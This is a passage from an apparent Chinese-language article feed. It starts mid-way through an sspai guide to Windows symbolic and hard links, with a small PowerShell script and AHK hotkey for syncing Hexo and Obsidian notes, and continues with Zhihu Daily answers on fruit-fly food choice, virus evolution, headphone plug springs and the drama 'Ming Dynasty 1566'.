自动为创建的链接添加特殊的标识，并且为其文件属性添加了诸如引用计数、符号链接目标等实用选项卡。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/e37364e1456f83d2008986a0a9b80af7\" alt=\"202107091659\"></figure><h2>用例一：使用 OneDrive 实时保存微信重要文件</h2>\n<p>Windows 中有许多虽然关键但难以移动位置的文件夹，要想使用 OneDrive 等云盘保存他们，往往只能另外复制一份，但这又面临着源文件更新的问题。</p>\n<p>举例来说，Windows 版微信会在文档中创建 WeChat Files 文件夹，其中有一个 File 目录包含了聊天中的已下载的各类文件，这个文件夹正是既重要又不太方便移动。</p>\n<p><strong>而符号链接可以让任何文件夹以任何名称出现在另一个地方</strong>，我们为此文件夹在 OneDrive 内创建一个符号链接，OneDrive 访问此链接时会被引导到微信的 File 文件夹内，其中的内容就会被全部上传到云端。</p>\n<p>整个实现的过程也非常简单：打开微信的 File 文件夹和 OneDrive 云盘本地文件夹，使用 Link Shell Extension 拖动创建一个符号链接，完成！</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/e0f1f8913fae278c0585c4c7bef6d601\" alt=\"20210709171744\"></figure><p>这样做了之后，在本地打开 File 符号链接时，会展现微信文件夹中的数据。而在 OneDrive 云端上，Files 则被视作一个正常的文件夹。还可以用类似的方法备份 QQ 的接收文件夹，Windows Appdata 中的一些设置文件等等。需要注意的是，当目标文件删除或消失时，OneDrive 也删除你的备份。</p>\n<p><strong>我们还可以考虑将上面的过程反过来</strong>！将目标文件或目录放在 OneDrive 中，在需要的程序文件夹中创建符号链接。在上面的例子中，即在 OneDrive 中放一个 File 文件夹，把微信中的 File 数据移动到此文件夹中，然后在微信的 FileStorage 中创建以 OneDrive 的 File 为目标的符号链接。</p>\n<p>这种做法好处是：程序卸载时只要提前将符号链接删除，就不必担心重要的文件会被卸载程序清除掉。</p>\n<h2>用例二：Hexo 和 Obsidian 文章实时同步</h2>\n<p>Hexo 是一个静态博客生成工具，Obsidian 则是一个本地笔记管理工具，这两个工具的库我都使用 Git 做版本管理。</p>\n<p>因为博客文章常常就是笔记中的文章，所以正常情况下，我需要将笔记中写好的 Markdown 复制粘贴到 Hexo 的博客目录下，然后再发布。一份文本此时被分成了两个数据，一旦需要更改，还得在两边分别编辑。</p>\n<p>既然这两个工具会使用到同一份文本，为什么不能使用硬链接将他们共同的 Markdown 连接在一起呢？</p>\n<p>需要做的工作是，在为 Hexo 创建文章时，同时在 Obsidian 的笔记目录下创建这个文章的硬链接。由于两者数据相通，在 Obsidian 处的编辑会自动同步到 Hexo 端。示例脚本 New-Blog.ps1 如下：</p>\n<pre class=\"language-code-line language-powershell\"><code>## 计数作为文件名\n$count = [System.IO.Directory]::GetFiles(\"$home\\Hexo\\source\\_posts\").Count\n## 提前写入 Markdown 的 yaml 头\n$date = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n$yaml = \"---\" + \"`ntitle: $count\" + \"`ndate: '$date'\" + \"`nupdated: '$date'\" + \"`ncategories: []\" + \"`ntags: [blog]\" + \"`ndescription:\" +\"`n`n---\"\n## 在 Hexo 中创建文件\nWrite-Output $yaml | Out-File $home\\Hexo\\source\\_posts\\$count.md\n## 在 Obsidian 中创建硬链接\nNew-Item $home\\Note\\$count.md -Type HardLink -Target $home\\Hexo\\source\\_posts\\$count.md\n## 退出\nexit</code></pre>\n<p>配合几行简单的 AHK 脚本：</p>\n<pre class=\"language-code-line language-ahk\"><code>#!N::\nrun, \"%USERPROFILE%\\Program\\New-Blog.ps1\",,hide\nreturn</code></pre>\n<p>当按下 Win + Alt + N 时，就会静默运行脚本，同时新建博客和笔记。重命名和移动文件都不会改变文件 ID，因此，只要不删除，无论在 Obsidian 上怎么折腾都不会影响两者的同步关系。如果我不满意某篇博客，在 Hexo 删除了它，那么文本在 Obsidian 那里仍然留存。</p>\n<p>在此例中，可能有人会问「为什么不用符号链接？」主要原因是 Obsidian 目前似乎有意<sup class=\"ss-footnote\" href=\"\" title=\"https://forum.obsidian.md/t/symlinks-are-unsupported-do-not-show-them-if-created-while-obs-is-running/417/6\" footnote-id=\"5\">5</sup>忽略掉笔记库的符号链接。另外，本例中的 Markdown 文件也比较适合使用硬链接。作为对比，Word 文档在编辑保存时原文件会被删除，替代以新文件，文件 ID 会改变，而这将导致链接失效。</p>\n<p>其他复杂的文件格式或特殊的编辑器可能也有类似的情况。</p>\n<h2>用例三：DeLorean Copy 实现增量备份</h2>\n<p>创建硬链接相当于创建文件的别名，正如我在第三节演示的那样，它可以实现在不增加体积的情况下创建文件的副本，这个特性让它非常适合用来备份文件。事实上，macOS 的时间机器功能正是使用了硬链接。</p>\n<p>而对于 Windows 用户而言，通过 Link Shell Extension 自带的 DeLorean Copy 功能即可实现增量备份和版本回溯。</p>\n<p>简单来说，在第一次备份完毕后，假如该文件夹发生了更改，DeLorean Copy 会自动分析更改后的文件夹和前一次备份的文件夹的区别，相同的文件会被创建硬链接，新的文件会被复制，删除的文件则会被丢弃，由此就形成了第二个备份。 当然，这都由程序自动完成，用户需要做的只是选择需要备份的文件夹，中键拖放，选择 DeLorean Copy。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/09/article/f490810a0d9ddf2c182135bc77fe9f2d\" alt=\"20210709202729\"></figure><p>如果想要为这个增量备份创建自动任务，则可以使用 <a href=\"https://schinagl.priv.at/nt/ln/ln.html\">ln.exe</a> 这个由同开发者开发的命令行程序，将 <code>ln --delorean</code> 作为命令写入脚本，再参考 <a href=\"https://sspai.com/post/66129\">Windows 本地自动化工具，任务计划程序应用举例</a> 一文设置任务计划程序即可。</p>\n<h2>小结</h2>\n<p>本文以 Windows 为例介绍符号链接和硬链接的原理及应用，但这两类链接不只用于 Windows，它们在不同的操作系统上都有着广泛的支持。虽然实现的原理可能不太相同，但在应用层面也许有一些共通之处。</p>\n<p>希望本文能够给你以启发。</p>\n<p>首页推广题图来自 <a href=\"https://www.freepik.com/vectors/background\" target=\"_blank\">Background vector created by rawpixel</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/66834"},{"title":"你会选择吃「巧克力味道的屎」还是「屎味的巧克力」？","date":"2021-07-10 23:06:17","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-7346051ab2a594b519bdae53eea1ac2a_l.jpg?source=8673f162\"><span>药明康德，</span><span>药明康德内容团队打造</span>\n<a href=\"https://www.zhihu.com/question/26471163/answer/1983399125\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>巧克力味的屎<em>vs</em>屎味的巧克力，你会选哪个</strong>？</p>\n<p>有人可能会从世界观角度分析，有人会引申到情感问题。</p>\n<p>而有些<strong>科学家最近做了一个真正的食物实验，分析了大脑在面对这个艰难选择时，是如何做决定的</strong>。当然，他们是用实验动物来做的。来看看他们刚刚发表在《自然》旗下子刊<em>Nature Communications</em>上的研究结果。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-a557cc35f8ce84f49ffeada0d1a88bd4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在这项研究中，耶鲁大学的科学家给果蝇同时准备了两份食物。<strong>果蝇的口味和人类有点像</strong>，爱吃甜甜的、高热量的食物，不爱吃苦——苦味往往意味着有毒有害。研究人员准备的食物，一份高热量，含有充足的糖分，但同时掺了奎宁，所以比较苦；另一份热量低，糖分较少，但没掺果蝇讨厌的苦味物质。</p>\n<p>那么，果蝇是如何选择的呢？选味道好的，还是吃得饱的？在它们做出选择时，它们的大脑是怎么“想”的呢？研究人员利用神经成像技术，跟踪记录了果蝇脑中的神经元活动。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-09cab0ce802803838e700f40c76b8b5e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>▲不太饿（禁食 2 小时和 6 小时）的果蝇，大多愿意选择糖分较少但不苦的食物；饿久了（禁食 21 小时），半数以上会选掺苦味的高糖食物（图片来源：参考资料[1]）</figcaption></figure><p>总的来说，<strong>果蝇的选择取决于它们有多饿。越饿，就越有可能忍受苦味来摄取更多的热量。</strong></p>\n<p>不过进一步研究显示，果蝇做出选择的背后，真正的神经机制要更复杂一些。</p>\n<p>根据研究人员的介绍，果蝇的味觉、嗅觉等感觉信息会传递到脑中的扇形体（fan-shaped body）区域，在那里整合各种信息，最终做出决策。</p>\n<p>利用光遗传学和化学连接组学等新方法，研究人员在扇形体中鉴定出一组特殊的神经元。被果蝇拒绝的味道会强烈抑制这些神经元的活动，意味着它们负责编码食物选择的行为。而且，出现新的食物选项时，这些神经元的活动模式会发生适应性变化。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-eac422b2a25beaa64ad218a7596ccaf8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>▲在果蝇的决策中心扇形体鉴定出一组神经元 FBl6，决定选哪种食物吃（图片来源：参考资料[1]）</figcaption></figure><p><strong>更有意思的是，研究人员确定了一个由神经肽和多巴胺等化学物质组成的上游信号网络，当他们人为操纵传入扇形体的神经信号，可以改变果蝇的选择。</strong>例如参与代谢的神经元被人为调低活性后，果蝇即使在饥饿状态下也会倾向于选择味道较好、营养较少的食物。</p>\n<p>这些结果表明，果蝇的小脑袋在面对艰难选择时，<strong>做出的决定不单考量了食物尝起来是甜的还是苦的（是屎味还是巧克力味），还取决于既有的经验（包括选择的后果）、饥饿的状态</strong>，这些信息都被整合到扇形体中。“这是一个很大的反馈环路，而不仅仅是自上而下的决策。”这项研究的负责人 Michael Nitabach 教授总结说。</p>\n<p>果蝇的选择，似乎也对人类有所启发。Nitabach 教授补充道：“这项研究提供了一个模板来了解饥饿和内部情绪状态等因素如何影响我们的行为。”</p>\n<p>研究人员指出，人类大脑中的神经活动同样受到神经肽和神经递质多巴胺分泌的调节，其中多巴胺与情绪和奖赏感有关。这个神经网络的变化会改变大脑对不同类型食物的反应。换句话说，<strong>我们认为自己有意识地做出了对食物的选择，有时可能默默地受到了神经化学的左右</strong>。</p>\n<div><code>参考资料： [1] Preeti Sareenet al., (2021) A neuronal ensemble encoding adaptive choice during sensoryconflict in Drosophila. Nature Communications. Doi: https://doi.org/10.1038/s41467-021-24423-y [2] More filling? Tastes great? How flies, and maybe people, choosetheir food. RetrievedJuly 6, 2021 from https://www.eurekalert.org/pub_releases/2021-07/yu-mft070121.php </code></div>\n<p><strong>▎药明康德内容团队编辑</strong></p>\n<p>注：本文旨在介绍医药健康研究进展，不是治疗方案推荐。如需获得治疗方案指导，请前往正规医院就诊。欢迎个人转发至朋友圈，谢绝媒体或机构未经授权以任何形式转载至其他平台。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/26471163\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737952"},{"title":"从进化的角度来看，病毒的最终目的是消灭所有宿主，还是其它？","date":"2021-07-10 23:06:09","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/da8e974dc_l.jpg?source=8673f162\"><span>知乎用户，</span><span>欢迎来星球做客：https://t.zsxq.com/7Iy7EeM</span>\n<a href=\"https://www.zhihu.com/question/267327196/answer/328154528\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢谢 <a href=\"http://www.zhihu.com/people/b1a3919d6cf4f505dd6f41f09c028437\">@Lightwing</a> 邀请。</p>\n<p>如果 从 非生物体来说，那就是完全随机的，没有意义了。</p>\n<p>所以，从生物体的角度来分析才能解释病毒的最终目的。</p>\n<hr>\n<p>那好，最为一种生物，最重要的是什么？</p>\n<p>当然是千秋万代的永远存续下去了。不存在的说明已经不适应环境，被淘汰了。</p>\n<p>我们现在能见到各色各样的病毒到底是什么样的祖先病毒进化来的，有很多说法，但是没有公认的结论。</p>\n<p>要达到永远存续的这个目的，有两种策略：</p>\n<p>第一，生物体永生不死；</p>\n<p>第二，生物体通过不断的繁殖（进化），通过子代来保证自己本种群的存续。</p>\n<p>第一条基本可以排除，那我们来看第二条，病毒是怎么实现的。</p>\n<hr>\n<p>病毒是一种<strong>完全的细胞内寄生生物</strong>，也就是说没有宿主细胞的情况下，它到底是死是活，其实我们是不清楚的。</p>\n<p>那作为寄生生物来说，</p>\n<p>（1）如果寄生物的存续需要宿主存活，那么病毒大几率是对宿主不致命的，或者是一段时间内宿主不会暴毙；这其中还可以分两类，一种是持续的慢性感染，与宿主长期存在的情况下不断释放，另一种是我来一会就走，就是把宿主当个公交车站，停一下，歇歇脚，获得更多子代后继续播散；</p>\n<p>（2）而如果寄生物的存续需要宿主死亡（比如释放子代），那么病毒肯定有多重杀招来 kill 宿主达到这个目的；</p>\n<p>（3）还有一种情况，病毒根本不在乎宿主存续，只是释放子代的时候会对宿主有很大伤害，很多宿主挺不过去，挂了；</p>\n<p>（4）最后就是，病毒本来针对的就不是这个宿主，只不过误打误撞的进来了，还成功复制了，但是宿主根本没见过这种东西，两相碰撞会有两种结果，1. 病毒逐渐适应新的宿主，2. 或者病毒很快消失的无影无踪。</p>\n<p>对于（1），我们现在见到的大多数对人致病的慢性感染病毒其实都属于这个类型，最典型的是 HIV 和 HBV，长期存在，在宿主生存的情况下不断向外排毒，这都是病毒完全适应后的一种策略，HIV 至今发现不过几十年，看看如今的广度，说明这个策略相当成功；而另一种的最大的代表就是流感病毒了，流感也是非常成功的病毒，一个喷嚏 N 个子代；但是一般情况下，人很少因为流感死亡（当然有例子）；</p>\n<p>（2）对于人来说，最典型的是狂犬病毒。对于温血动物来说，基本上，感染之后只有死路一条，患者最后的是发狂，不管是犬、狼还是人，最后都有非常强的攻击性，进而把病毒传递到下一个个个体。但是患者的死亡却并不是因为病毒感染的神经元细胞死亡引起的，大部分是类似呼吸等神经中枢的机能不正常而导致的个体死亡；</p>\n<p>（3）这种的例子有痘病毒，也就是天花。天花出痘的时候，那些痘浆里有很多传染性的病毒粒子的，有很强的感染性，我国宋代开始的人痘接种术就是用的研磨的痘痂，所以很有可能直接接种导致被感染。但对于病毒来说，出痘只是传播的手段，宿主的存续不在它的考虑范围之内。</p>\n<p>（4）我们现在的一大类“自然疫源性”病原体中的病毒就属于这一类，比如流行性出血热病毒，发热伴血小板减少综合征病毒，拉沙热病毒，埃博拉病毒等等，这些烈性病毒都是有自然宿主的，如果出现跨宿主传播，并成功在传播途径切断之前感染很多宿主，有可能就会进化出更多的特征而传播开来。另外的 SARS 病毒，也是无意中来了之后成功适应，但这种太偶然，不像一些啮齿类携带的容易与人接触，所以后续也无影无踪了，这类病毒的下一次宿主跳跃可能还需要广东的同学继续努力。</p>\n<hr>\n<p>总结：作为生物体的病毒，通过不断的繁殖（进化），通过子代来保证自己的存续，只不过方式不同，但是我们能见到的，都是进化的胜利者。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/267327196\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737929"},{"title":"耳机插头处用来保护的弹簧为什么没有广泛使用？","date":"2021-07-10 23:05:58","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-97bb86cb021b83f77ee51e3392237e88_l.jpg?source=8673f162\"><span>孟获，</span><span>别关注我，我不混知乎。不再接受付费问答。</span>\n<a href=\"https://www.zhihu.com/question/40704404/answer/312529579\" hidden>阅读原文</a>\n</div>\n<div>\n<p>谢邀。</p>\n<p>尾部弹簧和插头外壳金属是一体的。我手里，貌似就 cd900st 的 6.35 大插头上有这个，其他都没。</p>\n<p><strong>因为这不是唯一的方法。</strong>一体注塑成型的线尾部经常有这样的设计：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-11ce52dd1d10aa73b01c37f56da65119_720w.jpg?source=8673f162\" alt=\"\"></figure><p>和弹簧是等效的。注塑一次就全搞定了，成本低。</p>\n<p>防止导体断掉，高级的漆包线内部会有各种材料（棉、化纤、金属屏蔽层），承受弯折时弹性形变带来的力。</p>\n<p>总之，产品走量，一切省事为主。</p>\n<p>打通了上下游的供应商，一起定制线材就好说，全都选好料了就开工。但发烧线那么多有名的插头为啥不用这个设计呢？</p>\n<p>主要是，麻烦。纽崔克欧亚德都希望自己一个模具能兼容多种线径，弄个弹簧等于作茧自缚，产品泛用性大大降低。不如低成本解决。</p>\n<p>欧亚德正品插头尾部都给你一个塑料环，线径 3mm 以下可以用，让线卡得紧不晃，3.5mm 到 5mm 就用不了，直接怼。一个塑料环，和这个弹簧作用一样，兼容了更多的线材粗细，成本估计不到人民币一分钱。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-082e3e394e21ff8f4cbb98bf4a6ae890_720w.jpg?source=8673f162\" alt=\"\"></figure><p>线材损坏，拉拽比疲劳常见得多。只有你的耳机长年在一个环境下插拔插拔，像以前的电话交换机一样，那时候插头金属镀层磨损 + 线尾部的金属疲劳，才是最重要的损坏原因。这个弹簧，也是那个年代电话交换机时代的设计。</p>\n<p>所以，题主说的<strong>这东西曾经广泛使用过，但现在已经被前述办法代替了。</strong></p>\n<p>那问题反过来了。<strong>既然是老掉牙的设计，为啥 major 和 cd900st 还要用？</strong></p>\n<p>cd900st 因为人家在录音室里用，天天插来插去，器材都在架子上，线垂下来承受万有引力，还是托着点儿舒服。不信你找个 D+ 的问问钢圈的作用。</p>\n<p>major 是因为我要交换机 style，要伪蒸朋，要 1980s 质感，要复古范儿。</p>\n<p>日常出门的耳机使用么？最常见的损坏原因是，丢了，泡水了，地铁门扯断了。这个扯断，插头尾部的金属弹簧可不管用了。最管用的是线材上那一小段电话线的卷线设计。</p>\n<p>自我介绍，扯线狂人。关门断、自行车坐杆断、公车地铁断都经历过不止一次。家里几百一千的耳机线用来捆其他线当皮筋用，就因为断到没法焊。</p>\n<p>我们面对的是永恒的敌人——熵。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/40704404\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9737937"},{"title":"《大明王朝 1556》为什么会被奉为神作？","date":"2021-07-10 23:05:55","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-8746835926e283ff2ff3f41b521ad78f_l.jpg?source=8673f162\"><span>Paul，</span><span>写字拍照 微信公号：流浪荒岛（ID:llhd2046)</span>\n<a href=\"https://www.zhihu.com/question/411701070/answer/1968036633\" hidden>阅读原文</a>\n</div>\n<div>\n<p>纵观整个封建时代，【明】朝都都可以算是非常特别的朝代——历任的十几位帝王都极具鲜明“个性”、宦官权力之盛历朝历代也绝无仅有、官员俸禄之低几乎入不敷出……以上种种之乱象都可以在《大明王朝 1566》中一窥一二。嘉靖帝朱厚熜二十年不上朝，沉迷道术一心玄修；贪官被抓时理直气壮地称从不靠俸禄度日；宦官竟然可以带人鞭打朝廷官员……电视剧《大明王朝 1566》改编自刘和平同名小说，既然是小说作品，那就存在着虚构成分，与真实历史有所出入，但无论是小说文本还是电视作品，都<strong>本着客观的历史态度，对嘉靖帝时期的政治生态和事件进行了极为细致且贴近真实的想象与描述。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-f2dc02007767fdb10f17e92baa8df1c3_720w.jpg?source=8673f162\" alt=\"\"></figure><p>说起来简单，但执行起来其实有难度。大多数古装宫廷剧都是呈脸谱化的，忠臣奸臣，明君昏君，让观众一眼就能看出来，但这样的影视作品首先是娱乐化的，不严肃的，价值仅仅在于提供情绪释放的渠道，善有善报恶有恶报，<strong>忠臣会被奖赏，奸臣会被诛杀，本质上只是看故事，不是看历史，不是看政治，或是古代生活的其他细节。穿越剧之所以能风靡一时，无外乎人们对于古代生活的错误想象以及对于金钱、权力以及耍弄知识和智力的渴望</strong>，内容生产者洞察到人们的此类心理，相应的影视作品随之而出，其目的是讨好观众，创造利益。而《大明王朝 1566》最明显的特征是去脸谱化，不单单论好坏，<strong>人物的语言和行为与他的身份、所处的政治地位紧密相关，无论君王、大臣、宦官都有一套自己的理念与行为标准</strong>，所谓的忠臣清流也能弃百姓不顾，所谓的奸臣也会用贤能保全大局，而嘉靖帝更是道出了千百年的君臣之道，直接打破了人们对于权力的想象。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-14186033e5093fa1b828292f0b120f31_720w.jpg?source=8673f162\" alt=\"\"></figure><p>《大明王朝 1566》由湖南卫视出品，是一部意识非常超前的电视剧，超前到 2007 年播出时收视率极低，还不如湖南卫视自己出品的偶像剧，可谓尴尬。随着时间的推移，人们才逐渐发现这部剧的质量和深度。这部剧从名字上听起来很大，但从不为大求大，<strong>很多场景都有舞台剧式的调度，控制得紧凑、集约、凝练</strong>，比如，嘉靖帝和群臣之间的过招几乎全部集中于他的卧室的那处宫殿，小场景和大量人物神情特写则尤其考验演员们的台词和表情控制能力，所有演员都踏踏实实地演绎好了自己的部分，叫人看得过瘾！在配乐上，也用了不少西洋管弦乐，在我印象中，这在国产宫廷剧里似乎不常见，但这些配乐却并不突兀奇怪，反而增加了影像的戏剧效果。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-171320630cd5242380fce5d4279343c6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>嘉靖帝：权力的化身</strong>历史上的嘉靖帝十五岁登基，享年六十，在位整整四十五年。原本只是个距离正统皇室较远的世袭藩王，却意外地继承了皇位，更意外的是，这位年轻的君王天资聪颖，早早便展现了政治天赋，利用东厂压制文官集团稳固了自己的地位，确立了自身的合法性，掌握大权后，更是采取了一系列措施——整顿朝纲、压制外戚、任贤用能、还田于民，整个明朝可谓形势一片大好，但也止步于此了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-eea818d8de53f86df3e8878f02df2e4e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>此后的嘉靖帝一心玄修求长生，二十年不上朝，任用严嵩和宦官集团，在 1542 年的“壬寅宫变”中险些被宫女杀死，但嘉靖帝又是精明与可怕的，他依然是明朝的实际统治者和掌权者，同时也牢牢把控着财政。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2b597d955730caf83ce2fbe512e162e8_720w.jpg?source=8673f162\" alt=\"\"></figure><p>简而言之，这明明是一个拥有政治天赋和才华的帝王，却并没有带着他的王朝变得更好，反而沉溺于道术和权术之间。在《大明王朝 1566》里，他允许了内阁中的派系争斗，又放任了宦官以牵制官员，自己则作壁上观，从中制约调衡，渔翁得利。故事从国库空虚开始，严嵩父子和徐阶一派争执，最后嘉靖帝下令，一边抗倭，一边让浙江改稻为桑，以充实国库。由此，争斗序幕徐徐拉开，严世蕃想出了毁堤淹田的办法，联合制造局太监和杭州巡抚执行；裕王一派调用海瑞、王用汲予以牵制，两股势力在浙江交手。嘉靖帝一道政令，意在稳固自己的地位，他需要更多的钱去打仗、赈灾、修宫殿、豢养鹰犬；严嵩一党则是要给皇帝一个结果，同时也让自己的集团有利可图；裕王徐阶一派一面要想方设法扳倒严嵩，一面也尽量顾全民生（但从长远利益上考量，这是为了稳固裕王的地位）。所有的国产宫廷剧几乎都会出现奸臣贪官，而帝王也知道谁是奸臣贪官，但还是任用他们，这其中的原因被嘉靖帝的“长江黄河论”一语道破，帝王眼中没有忠臣和奸臣，只让合适的人做合适的事。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-0b27c8ed3fc32193176653baf87ee39a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>充实国库只能依赖严嵩一党，要保全自己的名声，又要靠朝廷中的清流，要牵制朝臣，又要差遣宫中宦官，宦官是皇帝的家臣，因此大量的贪污都和皇宫中有着直接的关系，嘉靖当然知道，只是睁一只眼闭一只眼罢了。对于严嵩一党，嘉靖亦是如此，默许了官员的贪墨，甚至与他们分钱。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-90b5f78f321f4ec0587fb857691e32d4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在大量的影视剧中，我们一直以来形成的印象是帝王是天子，天然具有无上的权威，<strong>但在《大明王朝 1566》中并非如此，帝王藏匿在背后，利用、牵制、制约各派势力，从而形成自身的权威，稳固君权，这才是真实。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2b5f66965547a88e3ebe4a54aa066d91_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>海瑞：现代人理想的投射</strong>古往今来，人民群众对于清官似乎有一种偏执，总希望有青天大老爷能出来伸张正义，或许可以理解为封建时代的百姓地位确实低下，受苦受难，而《大明王朝 1566》中的海瑞也完完全全符合大家对于清官的理想，一身正气，双目如炬，嫉贪如仇，言必大明律法黎明百姓，孝顺母亲，体贴妻女，简直过于完美。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-beeafbc9f283b4ec36dc7b1f84f7b52f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>查阅了《明史·海瑞传》，古文中的海瑞和电视剧中的海瑞似乎可以统一起来，但电视剧中的海瑞还是美化得过分了，不可当真，也不必当真。电视剧中的海瑞是个完完全全的异类，“以百姓之心为心”、“民为重社稷次之，君为轻”，极度清廉，主张君臣共治，以至于他的上司赵贞吉说他“博直名”、“大忠似伪”。要不是因为生在明朝，真想推荐他立刻入党（不是玩笑），他的理想和理念都是非常现代的，凡事有法可依有法必依，心系群众，从来没有灰色收入，不拿群众一针一线，从不参与党派斗争，敢于直接反驳上司，备一口棺材上一道奏疏，将自己的君主黑得体无完肤，纵观历史恐怕也只此一人。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b12c266d4e47a56e47f8b6de0ceed6b4_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在黄志忠的演绎下，一位瘦弱文官竟有军人气质，书生有了武人的威严，这样的表演处理方式也是非常巧妙。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-40faa790a87cdddb3c6ccf7850329c0a_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>内阁与宦官：天平的两端</strong>从上个世纪港片兴盛开始，武侠动作片就尤其喜欢将时代背景定在明朝，将反派设为某位太监。因为肉身的残缺，这些太监往往心理扭曲、变态、残忍，然而得益于去势与早早混迹于宫廷，他们又往往精明能干、专注、敏感、善于审时度势察言观色，况且还能够拥有极大的权力，简直就是反派的不二人选。按照大明祖制，太监不得读书识字，但到了明宣宗开始，太监不仅可以读书识字，还被鼓励学习，宫廷内部还开设了太监学堂，由此，太监与太监机构逐渐进入到了政治运转的体系中。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-25a22e3fcb67744427183bfe910b0517_720w.jpg?source=8673f162\" alt=\"\"></figure><p>电视剧里，可以看到，所有内阁的票拟（奏折）都要由司礼监批红，而太监是嘉靖的家臣，也就是说，<strong>太监的职能不仅仅是服务帝王的饮食起居和皇宫中各项职能的运转，同时也包括帮助皇帝管理政治事务，牵制内阁的权力。</strong>正因为太监是皇帝的家臣，所有人都会对太监忌惮三分，而太监与太监所管辖的机构也直接代表着皇帝，因此，杨金水必须立刻将沈一石打着江南制造局的名义去低价购售稻田的事情上报，以转嫁连带责任（但沈一石的盘算是去赈灾，这让所有人都始料未及）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ba3b9f355c7b91731c84649a675a0e6b_720w.jpg?source=8673f162\" alt=\"\"></figure><p>有人的地方就有江湖，内阁之中也有派系，太监内部亦有派系，吕芳是温和派，以德服人，尽量维系内阁两派的关系为嘉靖服务；陈洪可以算是武斗派，对手下人严厉，对官员更是凶狠鞭打。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-775b944675c97cbd5e9d54e4c0e665a2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>在电视剧前半部分，嘉靖之所以用吕芳，因为内阁分两派势力，他需要一个人去维系，不能让两派完全闹僵，让政令无法实施；而后半部分嘉靖又任用了陈洪，因为内阁已经没有了严嵩一党，他需要一个更狠的人去压制内阁和群臣，所以很明显的一点是嘉靖是更喜欢太监黄锦的，并且在神色间也有对陈洪的厌恶，但还是重用了陈洪，并且告诫黄锦不要跟陈洪过不去。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3af0afa43905721be1a3e67b32950c5a_720w.jpg?source=8673f162\" alt=\"\"></figure><p>嘉靖坐在天平的中央，冷酷到可以放弃自己的好恶，运用不同的人去让天平保持住平衡，这种高压模式的最终结果就是没有人敢惹嘉靖生气，即便国库空虚群臣们也要拨钱出来修宫殿，天子脚下有灾情也不敢上报，而<strong>陈宝国也恰好演出了嘉靖身上的复杂性，威严、敏感、多疑、震怒、衰颓、悔恨……极大程度地满足了观众对于真实的嘉靖的想象。</strong>另外一位不得不说的演员是倪大红，演出严嵩时，他不过 40 岁，比饰演严嵩儿子严世蕃的张志坚还要小 5 岁。据说，当时剧组对于倪大红出演严嵩存在疑虑，毕竟严嵩已经八十岁，可化妆之后，倪大红的严嵩扮相已然令众人折服。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-acf225df1cfc41914dce8d6fcb5a7a11_720w.jpg?source=8673f162\" alt=\"\"></figure><p>倪大红的严嵩一角即便在整个中国电视剧史里也可称得上是经典，什么叫老谋深算，什么叫不动声色，什么叫城府心机，看完倪大红表演的严嵩就全明白了，扮相上的优势且不说，沉稳之态更是拿捏得恰到好处，俨然一个官场沉浮数十载的“妖人”，但无奈年事已高，体力衰退，已经不能做到明察秋毫，在嘉靖面前败下阵来，或者说故意示弱，以求政敌和嘉靖的怜悯，这一点倪大红亦展现非常出色。更重要的是，明知道这是个大奸臣，却让人讨厌不起来，反而还觉得他可怜，可谓神奇。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-b6c758148121e4fabd7989482b289a8e_720w.jpg?source=8673f162\" 